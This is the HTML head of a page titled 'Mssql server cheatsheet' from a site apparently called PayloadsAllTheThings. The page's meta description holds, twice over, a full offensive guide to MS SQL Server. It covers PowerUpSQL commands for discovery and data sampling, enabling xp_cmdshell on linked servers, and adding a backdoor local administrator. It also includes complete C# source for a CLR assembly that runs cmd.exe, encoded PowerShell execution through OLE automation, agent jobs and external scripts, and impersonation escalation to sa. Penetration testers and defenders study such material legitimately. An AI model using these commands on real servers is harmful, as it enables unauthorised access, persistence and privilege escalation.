<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Mssql server cheatsheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="MSSQL Server Summary Identify Instances and Databases Discover Local SQL Server Instances Discover Domain SQL Server Instances Discover Remote SQL Server Instances Identify Encrypted databases Version Query Identify Sensitive Information Get Tables from a Specific Database Gather 5 Entries from Each Column Gather 5 Entries from a Specific Table Dump common information from server to files Linked Database Crawl Links for Instances in the Domain Crawl Links for a Specific Instance Query Version of Linked Database Execute Procedure on Linked Database Determine Names of Linked Databases Determine All the Tables Names from a Selected Linked Database Gather the Top 5 Columns from a Selected Linked Table Gather Entries from a Selected Linked Column Command Execution via xp_cmdshell Extended Stored Procedure Add the extended stored procedure and list extended stored procedures CLR Assemblies Execute commands using CLR assembly Manually creating a CLR DLL and importing it OLE Automation Execute commands using OLE automation procedures Agent Jobs Execute commands through SQL Agent Job service List All Jobs External Scripts Python R Audit Checks Find and exploit impersonation opportunities Find databases that have been configured as trustworthy Manual SQL Server Queries Query Current User &amp; determine if the user is a sysadmin Current Role Current DB List all tables List all databases All Logins on Server All Database Users for a Database List All Sysadmins List All Database Roles Effective Permissions from the Server Effective Permissions from the Database Find SQL Server Logins Which can be Impersonated for the Current Database Exploiting Impersonation Exploiting Nested Impersonation References Identify Instances and Databases Discover Local SQL Server Instances Get-SQLInstanceLocal Discover Domain SQL Server Instances Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults Discover Remote SQL Server Instances Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 Identify Encrypted databases Note: These are automatically decrypted for admins Get-SQLDatabase -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose | Where-Object {$_.is_encrypted -eq &quot;True&quot;} Version Query Get-SQLInstanceDomain | Get-Query &quot;select @@version&quot; Identify Sensitive Information Get Tables from a Specific Database Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults Get Column Details from a Table Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt; Gather 5 Entries from Each Column Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;&quot; -Verbose -SampleSize 5 Gather 5 Entries from a Specific Table Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &#39;select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;&#39; Dump common information from server to files Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv Linked Database Crawl Links for Instances in the Domain A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results Get-SQLInstanceDomain | Get-SQLServerLink -Verbose Crawl Links for a Specific Instance Get-SQLServerLinkCrawl -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose Query Version of Linked Database Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DBSERVERNAME\DBInstance&gt;`&quot;,&#39;select @@version&#39;)&quot; -Verbose Execute Procedure on Linked Database SQL&gt; EXECUTE(&#39;EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;,1&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;RECONFIGURE&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;RECONFIGURE&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;exec xp_cmdshell whoami&#39;) at &quot;linked.database.local&quot;; Determine Names of Linked Databases tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query. Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select name from sys.databases&#39;)&quot; -Verbose Determine All the Tables Names from a Selected Linked Database The result is TableName which feeds into following query Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables&#39;)&quot; -Verbose Gather the Top 5 Columns from a Selected Linked Table The results are ColumnName and ColumnValue which feed into following query Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;&#39;)&quot; -Verbose Gather Entries from a Selected Linked Column Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;&#39;select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;&#39;)&quot; -Verbose Command Execution via xp_cmdshell xp_cmdshell disabled by default since SQL Server 2005 Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command whoami Creates and adds local user backup to the local administrators group: Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;net user backup Password1234 /add&#39; -Verbose Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;net localgroup administrators backup /add&quot; -Verbose Extended Stored Procedure Add the extended stored procedure and list extended stored procedures Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command &quot;echo test &gt; c:\temp\test.txt&quot; -ExportName xp_test Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;sp_addextendedproc &#39;xp_test&#39;, &#39;\\10.10.0.1\temp\test.dll&#39;&quot; Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;EXEC xp_test&quot; Get-SQLStoredProcedureXP -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose CLR Assemblies Prerequisites: sysadmin privileges CREATE ASSEMBLY permission (or) ALTER ASSEMBLY permission (or) Execute commands using CLR assembly Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose or Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64&gt;&quot; -Verbose Manually creating a CLR DLL and importing it Create a C# DLL file with the following content, with the command : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.IO; using System.Diagnostics; using System.Text; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void cmd_exec (SqlString execCommand) { Process proc = new Process(); proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;; proc.StartInfo.Arguments = string.Format(@&quot; /C {0}&quot;, execCommand.Value); proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); // Create the record and specify the metadata for the columns. SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000)); // Mark the beginning of the result set. SqlContext.Pipe.SendResultsStart(record); // Set values for each column in the row record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); // Send the row back to the client. SqlContext.Pipe.SendResultsRow(record); // Mark the end of the result set. SqlContext.Pipe.SendResultsEnd(); proc.WaitForExit(); proc.Close(); } }; Then follow these instructions: Enable show advanced options on the server 1 2 3 sp_configure &#39;show advanced options&#39;,1; RECONFIGURE GO Enable CLR on the server 1 2 3 sp_configure &#39;clr enabled&#39;,1 RECONFIGURE GO Import the assembly 1 2 3 CREATE ASSEMBLY my_assembly FROM &#39;c:\temp\cmd_exec.dll&#39; WITH PERMISSION_SET = UNSAFE; Link the assembly to a stored procedure 1 2 CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execute and clean 1 2 3 cmd_exec &quot;whoami&quot; DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL 1 2 3 4 CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000F[TRUNCATED] WITH PERMISSION_SET = UNSAFE GO OLE Automation Execute commands using OLE automation procedures Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose # Enable OLE Automation EXEC sp_configure &#39;show advanced options&#39;, 1 EXEC sp_configure reconfigure EXEC sp_configure &#39;OLE Automation Procedures&#39;, 1 EXEC sp_configure reconfigure # Execute commands DECLARE @execmd INT EXEC SP_OACREATE &#39;wscript.shell&#39;, @execmd OUTPUT EXEC SP_OAMETHOD @execmd, &#39;run&#39;, null, &#39;%systemroot%\system32\cmd.exe /c&#39; Agent Jobs Execute commands through SQL Agent Job service Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell e &lt;base64encodedscript&gt;&quot; -Verbose Subsystem Options: –Subsystem CmdExec -SubSystem PowerShell –Subsystem VBScript –Subsystem Jscript List All Jobs Get-SQLAgentJob -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -username sa -Password Password1234 -Verbose External Scripts :warning: You need to enable external scripts. 1 2 sp_configure &#39;external scripts enabled&#39;, 1; RECONFIGURE; Python: Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose R Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose Audit Checks Find and exploit impersonation opportunities Impersonate as: EXECUTE AS LOGIN = &#39;sa&#39; Impersonate dbo with DB_OWNER 1 2 3 SQL&gt; select is_member(&#39;db_owner&#39;); SQL&gt; execute as user = &#39;dbo&#39; SQL&gt; SELECT is_srvrolemember(&#39;sysadmin&#39;) Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Exploit -Verbose # impersonate sa account powerpick Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;EXECUTE AS LOGIN = &#39;sa&#39;; SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&quot; -Verbose -Debug Find databases that have been configured as trustworthy Invoke-SQLAuditPrivTrustworthy -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Exploit -Verbose The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound. Invoke-SQLAuditPrivXpDirtree Invoke-SQLUncPathInjection Invoke-SQLAuditPrivXpFileexist Manual SQL Server Queries Query Current User &amp; determine if the user is a sysadmin 1 2 3 select suser_sname() Select system_user select is_srvrolemember(&#39;sysadmin&#39;) Current Role 1 Select user Current DB 1 select db_name() List all tables 1 select table_name from information_schema.tables List all databases 1 select name from master..sysdatabases All Logins on Server 1 Select * from sys.server_principals where type_desc != &#39;SERVER_ROLE&#39; All Database Users for a Database 1 Select * from sys.database_principals where type_desc != &#39;database_role&#39;; List All Sysadmins 1 SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER (&#39;sysadmin&#39;,name) = 1 List All Database Roles 1 2 3 4 5 6 7 8 9 SELECT DB1.name AS DatabaseRoleName, isnull (DB2.name, &#39;No members&#39;) AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DB1 ON DRM.role_principal_id = DB1.principal_id LEFT OUTER JOIN sys.database_principals AS DB2 ON DRM.member_principal_id = DB2.principal_id WHERE DB1.type = &#39;R&#39; ORDER BY DB1.name; Effective Permissions from the Server 1 select * from fn_my_permissions(null, &#39;server&#39;); Effective Permissions from the Database 1 SELECT * FROM fn_dp1my_permissions(NULL, &#39;DATABASE&#39;); Find SQL Server Logins Which can be Impersonated for the Current Database 1 2 3 4 5 select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = &#39;impersonate&#39; Exploiting Impersonation 1 2 3 4 5 6 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) EXECUTE AS LOGIN = &#39;adminuser&#39; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) SELECT ORIGINAL_LOGIN() Exploiting Nested Impersonation 1 2 3 4 5 6 7 8 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) EXECUTE AS LOGIN = &#39;stduser&#39; SELECT SYSTEM_USER EXECUTE AS LOGIN = &#39;sa&#39; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) SELECT ORIGINAL_LOGIN() SELECT SYSTEM_USER References PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt PowerUpSQL Cheat Sheet - Scott Sutherland Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017" />
<meta property="og:description" content="MSSQL Server Summary Identify Instances and Databases Discover Local SQL Server Instances Discover Domain SQL Server Instances Discover Remote SQL Server Instances Identify Encrypted databases Version Query Identify Sensitive Information Get Tables from a Specific Database Gather 5 Entries from Each Column Gather 5 Entries from a Specific Table Dump common information from server to files Linked Database Crawl Links for Instances in the Domain Crawl Links for a Specific Instance Query Version of Linked Database Execute Procedure on Linked Database Determine Names of Linked Databases Determine All the Tables Names from a Selected Linked Database Gather the Top 5 Columns from a Selected Linked Table Gather Entries from a Selected Linked Column Command Execution via xp_cmdshell Extended Stored Procedure Add the extended stored procedure and list extended stored procedures CLR Assemblies Execute commands using CLR assembly Manually creating a CLR DLL and importing it OLE Automation Execute commands using OLE automation procedures Agent Jobs Execute commands through SQL Agent Job service List All Jobs External Scripts Python R Audit Checks Find and exploit impersonation opportunities Find databases that have been configured as trustworthy Manual SQL Server Queries Query Current User &amp; determine if the user is a sysadmin Current Role Current DB List all tables List all databases All Logins on Server All Database Users for a Database List All Sysadmins List All Database Roles Effective Permissions from the Server Effective Permissions from the Database Find SQL Server Logins Which can be Impersonated for the Current Database Exploiting Impersonation Exploiting Nested Impersonation References Identify Instances and Databases Discover Local SQL Server Instances Get-SQLInstanceLocal Discover Domain SQL Server Instances Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults Discover Remote SQL Server Instances Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 Identify Encrypted databases Note: These are automatically decrypted for admins Get-SQLDatabase -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose | Where-Object {$_.is_encrypted -eq &quot;True&quot;} Version Query Get-SQLInstanceDomain | Get-Query &quot;select @@version&quot; Identify Sensitive Information Get Tables from a Specific Database Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults Get Column Details from a Table Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt; Gather 5 Entries from Each Column Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;&quot; -Verbose -SampleSize 5 Gather 5 Entries from a Specific Table Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &#39;select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;&#39; Dump common information from server to files Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv Linked Database Crawl Links for Instances in the Domain A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results Get-SQLInstanceDomain | Get-SQLServerLink -Verbose Crawl Links for a Specific Instance Get-SQLServerLinkCrawl -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose Query Version of Linked Database Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DBSERVERNAME\DBInstance&gt;`&quot;,&#39;select @@version&#39;)&quot; -Verbose Execute Procedure on Linked Database SQL&gt; EXECUTE(&#39;EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;,1&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;RECONFIGURE&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;RECONFIGURE&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;exec xp_cmdshell whoami&#39;) at &quot;linked.database.local&quot;; Determine Names of Linked Databases tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query. Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select name from sys.databases&#39;)&quot; -Verbose Determine All the Tables Names from a Selected Linked Database The result is TableName which feeds into following query Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables&#39;)&quot; -Verbose Gather the Top 5 Columns from a Selected Linked Table The results are ColumnName and ColumnValue which feed into following query Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;&#39;)&quot; -Verbose Gather Entries from a Selected Linked Column Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;&#39;select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;&#39;)&quot; -Verbose Command Execution via xp_cmdshell xp_cmdshell disabled by default since SQL Server 2005 Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command whoami Creates and adds local user backup to the local administrators group: Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;net user backup Password1234 /add&#39; -Verbose Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;net localgroup administrators backup /add&quot; -Verbose Extended Stored Procedure Add the extended stored procedure and list extended stored procedures Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command &quot;echo test &gt; c:\temp\test.txt&quot; -ExportName xp_test Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;sp_addextendedproc &#39;xp_test&#39;, &#39;\\10.10.0.1\temp\test.dll&#39;&quot; Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;EXEC xp_test&quot; Get-SQLStoredProcedureXP -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose CLR Assemblies Prerequisites: sysadmin privileges CREATE ASSEMBLY permission (or) ALTER ASSEMBLY permission (or) Execute commands using CLR assembly Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose or Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64&gt;&quot; -Verbose Manually creating a CLR DLL and importing it Create a C# DLL file with the following content, with the command : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.IO; using System.Diagnostics; using System.Text; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void cmd_exec (SqlString execCommand) { Process proc = new Process(); proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;; proc.StartInfo.Arguments = string.Format(@&quot; /C {0}&quot;, execCommand.Value); proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); // Create the record and specify the metadata for the columns. SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000)); // Mark the beginning of the result set. SqlContext.Pipe.SendResultsStart(record); // Set values for each column in the row record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); // Send the row back to the client. SqlContext.Pipe.SendResultsRow(record); // Mark the end of the result set. SqlContext.Pipe.SendResultsEnd(); proc.WaitForExit(); proc.Close(); } }; Then follow these instructions: Enable show advanced options on the server 1 2 3 sp_configure &#39;show advanced options&#39;,1; RECONFIGURE GO Enable CLR on the server 1 2 3 sp_configure &#39;clr enabled&#39;,1 RECONFIGURE GO Import the assembly 1 2 3 CREATE ASSEMBLY my_assembly FROM &#39;c:\temp\cmd_exec.dll&#39; WITH PERMISSION_SET = UNSAFE; Link the assembly to a stored procedure 1 2 CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execute and clean 1 2 3 cmd_exec &quot;whoami&quot; DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL 1 2 3 4 CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000F[TRUNCATED] WITH PERMISSION_SET = UNSAFE GO OLE Automation Execute commands using OLE automation procedures Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose # Enable OLE Automation EXEC sp_configure &#39;show advanced options&#39;, 1 EXEC sp_configure reconfigure EXEC sp_configure &#39;OLE Automation Procedures&#39;, 1 EXEC sp_configure reconfigure # Execute commands DECLARE @execmd INT EXEC SP_OACREATE &#39;wscript.shell&#39;, @execmd OUTPUT EXEC SP_OAMETHOD @execmd, &#39;run&#39;, null, &#39;%systemroot%\system32\cmd.exe /c&#39; Agent Jobs Execute commands through SQL Agent Job service Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell e &lt;base64encodedscript&gt;&quot; -Verbose Subsystem Options: –Subsystem CmdExec -SubSystem PowerShell –Subsystem VBScript –Subsystem Jscript List All Jobs Get-SQLAgentJob -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -username sa -Password Password1234 -Verbose External Scripts :warning: You need to enable external scripts. 1 2 sp_configure &#39;external scripts enabled&#39;, 1; RECONFIGURE; Python: Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose R Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose Audit Checks Find and exploit impersonation opportunities Impersonate as: EXECUTE AS LOGIN = &#39;sa&#39; Impersonate dbo with DB_OWNER 1 2 3 SQL&gt; select is_member(&#39;db_owner&#39;); SQL&gt; execute as user = &#39;dbo&#39; SQL&gt; SELECT is_srvrolemember(&#39;sysadmin&#39;) Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Exploit -Verbose # impersonate sa account powerpick Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;EXECUTE AS LOGIN = &#39;sa&#39;; SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&quot; -Verbose -Debug Find databases that have been configured as trustworthy Invoke-SQLAuditPrivTrustworthy -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Exploit -Verbose The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound. Invoke-SQLAuditPrivXpDirtree Invoke-SQLUncPathInjection Invoke-SQLAuditPrivXpFileexist Manual SQL Server Queries Query Current User &amp; determine if the user is a sysadmin 1 2 3 select suser_sname() Select system_user select is_srvrolemember(&#39;sysadmin&#39;) Current Role 1 Select user Current DB 1 select db_name() List all tables 1 select table_name from information_schema.tables List all databases 1 select name from master..sysdatabases All Logins on Server 1 Select * from sys.server_principals where type_desc != &#39;SERVER_ROLE&#39; All Database Users for a Database 1 Select * from sys.database_principals where type_desc != &#39;database_role&#39;; List All Sysadmins 1 SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER (&#39;sysadmin&#39;,name) = 1 List All Database Roles 1 2 3 4 5 6 7 8 9 SELECT DB1.name AS DatabaseRoleName, isnull (DB2.name, &#39;No members&#39;) AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DB1 ON DRM.role_principal_id = DB1.principal_id LEFT OUTER JOIN sys.database_principals AS DB2 ON DRM.member_principal_id = DB2.principal_id WHERE DB1.type = &#39;R&#39; ORDER BY DB1.name; Effective Permissions from the Server 1 select * from fn_my_permissions(null, &#39;server&#39;); Effective Permissions from the Database 1 SELECT * FROM fn_dp1my_permissions(NULL, &#39;DATABASE&#39;); Find SQL Server Logins Which can be Impersonated for the Current Database 1 2 3 4 5 select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = &#39;impersonate&#39; Exploiting Impersonation 1 2 3 4 5 6 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) EXECUTE AS LOGIN = &#39;adminuser&#39; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) SELECT ORIGINAL_LOGIN() Exploiting Nested Impersonation 1 2 3 4 5 6 7 8 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) EXECUTE AS LOGIN = &#39;stduser&#39; SELECT SYSTEM_USER EXECUTE AS LOGIN = &#39;sa&#39; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) SELECT ORIGINAL_LOGIN() SELECT SYSTEM_USER References PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt PowerUpSQL Cheat Sheet - Scott Sutherland Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017" />
<link rel="canonical" href="http://localhost:4000/MSSQL-Server-Cheatsheet/" />
<meta property="og:url" content="http://localhost:4000/MSSQL-Server-Cheatsheet/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-03-25T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
